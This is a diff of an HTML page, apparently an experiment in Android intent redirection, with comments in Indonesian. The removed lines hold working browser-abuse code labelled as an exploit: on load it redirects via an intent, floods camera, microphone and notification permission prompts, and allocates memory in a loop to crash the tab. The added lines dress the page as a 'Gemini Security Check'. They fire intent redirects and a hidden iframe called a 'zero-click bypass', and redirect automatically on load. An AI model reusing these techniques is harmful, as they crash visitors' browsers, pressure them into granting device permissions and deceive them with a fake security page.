@@ -6,118 +6,115 @@
 <title>System Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #111; color: #f00; font-family: monospace; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; text-align: center; }
-  iframe { display: none; }
-  h1 { animation: blink 0.5s infinite; }
-  @keyframes blink { 50% { opacity: 0.2; } }
-  #status { position: fixed; bottom: 20px; color: #0f0; }
+  body {
+    background: #f4f6f8;
+    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    display: flex; justify-content: center; align-items: center;
+    height: 100vh; margin: 0; flex-direction: column;
+  }
+  .panel {
+    background: #fff; padding: 40px; border-radius: 12px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center;
+    max-width: 400px; width: 100%;
+  }
+  h1 { color: #333; margin-bottom: 10px; font-size: 22px; }
+  p { color: #666; margin-bottom: 20px; font-size: 14px; }
+  button {
+    background: #007aff; color: #fff; padding: 15px;
+    border-radius: 8px; font-size: 16px; font-weight: bold;
+    cursor: pointer; border: none; width: 100%;
+  }
+  button:hover { background: #005bb5; }
+  #log {
+    margin-top: 20px; background: #000; color: #0f0;
+    padding: 10px; font-family: monospace; font-size: 12px;
+    border-radius: 6px; width: 100%; max-width: 400px;
+    height: 100px; overflow-y: auto; text-align: left;
+  }
 </style>
 </head>
 <body>
 
-<h1>☢️ SYSTEM FAILURE ☢️</h1>
-<div id="status">Initializing Exploit...</div>
+<div class="panel">
+  <h1>🔒 Gemini Security Check</h1>
+  <p>Klik tombol di bawah untuk memverifikasi integrasi AI.</p>
+  <button id="intentBtn">Open Gemini</button>
+</div>
+
+<div id="log">Sistem siap...</div>
 
 <script>
 (function () {
   'use strict';
 
-  var statusEl = document.getElementById('status');
+  var logEl = document.getElementById('log');
+  function log(msg) {
+    logEl.innerHTML += "> " + msg + "<br>";
+    console.log(msg);
+  }
 
   // ============================================
-  // 1. INTENT REDIRECTION (ANDROID / CHROME)
+  // 1. KONFIGURASI INTENT GEMINI
   // ============================================
-  function triggerIntent() {
-    console.log("[!] Triggering Intent Redirection...");
-    statusEl.innerText = "Executing Intent...";
-    
-    // Skema Intent: Membuka Settings Android
-    // Bisa diganti dengan: intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end
-    var intentUrl = "intent://settings/#Intent;action=android.settings.SETTINGS;end";
-    
+  // Package name Gemini: com.google.android.apps.bard
+  
+  // Format 1: Intent Scheme (Deep Link)
+  var intentGemini = "intent://launch/#Intent;scheme=googleapp;package=com.google.android.apps.bard;end";
+  
+  // Format 2: Fallback Web URL (Jika Intent gagal)
+  var fallbackUrl = "https://gemini.google.com/";
+
+  // Format 3: Intent dengan Fallback URL
+  var intentWithFallback = "intent://launch/#Intent;" +
+                           "scheme=googleapp;" +
+                           "package=com.google.android.apps.bard;" +
+                           "S.browser_fallback_url=" + encodeURIComponent(fallbackUrl) + ";" +
+                           "end";
+
+  console.log("Intent Target: " + intentGemini);
+
+  // ============================================
+  // 2. EKSEKUSI INTENT
+  // ============================================
+  document.getElementById('intentBtn').addEventListener('click', function() {
+    log("[!] Memicu Intent Redirection ke Gemini...");
+
+    // A. Coba Intent dengan Fallback (Paling stabil)
     try {
-      // Trik 1: Location Replace
-      window.location.replace(intentUrl);
-    } catch(e) {}
+      window.location.href = intentWithFallback;
+      log("[+] Intent with Fallback dicoba.");
+    } catch(e) {
+      log("[-] Gagal: " + e.message);
+    }
 
-    // Trik 2: Iframe Sandbox
+    // B. Coba Intent Murni (Tanpa Fallback)
+    setTimeout(function() {
+      try {
+        window.location.href = intentGemini;
+        log("[+] Pure Intent dicoba.");
+      } catch(e) {}
+    }, 500);
+
+    // C. Coba Iframe Sandbox (Zero-Click Bypass)
     setTimeout(function() {
       var iframe = document.createElement('iframe');
       iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
-      iframe.src = intentUrl;
+      iframe.src = intentGemini;
       iframe.style.display = "none";
       document.body.appendChild(iframe);
-    }, 500);
-  }
+      log("[+] Iframe Sandbox dicoba.");
+    }, 1000);
+  });
 
   // ============================================
-  // 2. PERMISSION EXHAUSTION (CAMERA & MIC FLOOD)
+  // 3. ZERO-CLICK ATTEMPT (Otomatis saat Load)
   // ============================================
-  function triggerPermissionFlood() {
-    console.log("[!] Triggering Permission Flood...");
-    statusEl.innerText = "Exhausting Permissions...";
-
-    var count = 0;
-    // Loop setiap 100ms untuk meminta izin
-    var interval = setInterval(function() {
-      try {
-        // Minta Izin Kamera & Mic
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-          navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-            .then(function(stream) {
-              console.log("🚨 KAMERA DIIZINKAN!");
-              stream.getTracks().forEach(function(t) { t.stop(); });
-            })
-            .catch(function(err) {
-              // Abaikan penolakan
-            });
-        }
-
-        // Minta Izin Notifikasi
-        if ('Notification' in window && Notification.permission === 'default') {
-          Notification.requestPermission();
-        }
-
-        count++;
-        statusEl.innerText = "Permission Requests: " + count;
-
-        // Setelah 50 permintaan, hentikan loop
-        if (count > 50) clearInterval(interval);
-
-      } catch(e) {}
-    }, 100);
-  }
-
-  // ============================================
-  // 3. RESOURCE EXHAUSTION (OOM CRASH)
-  // ============================================
-  var memoryHog = [];
-  function triggerCrash() {
-    console.log("[!] Initiating OOM Crash...");
-    statusEl.innerText = "SYSTEM CRITICAL...";
-
-    setInterval(function() {
-      try {
-        // Alokasi 100MB ArrayBuffer per 50ms
-        var bigArray = new Uint8Array(100 * 1024 * 1024);
-        bigArray.fill(1);
-        memoryHog.push(bigArray);
-      } catch(e) {}
-    }, 50);
-  }
-
-  // ============================================
-  // EKSEKUSI BERTAHAP
-  // ============================================
-  
-  // 1. Trigger Intent setelah 100ms
-  setTimeout(triggerIntent, 100);
-
-  // 2. Trigger Permission Flood setelah 500ms
-  setTimeout(triggerPermissionFlood, 500);
-
-  // 3. Trigger Crash (OOM) setelah 1.5 detik
-  setTimeout(triggerCrash, 1500);
+  setTimeout(function() {
+    log("[Zero-Click] Mencoba membuka Gemini...");
+    try {
+      window.location.href = intentWithFallback;
+    } catch(e) {}
+  }, 2000);
 
 })();
 </script>
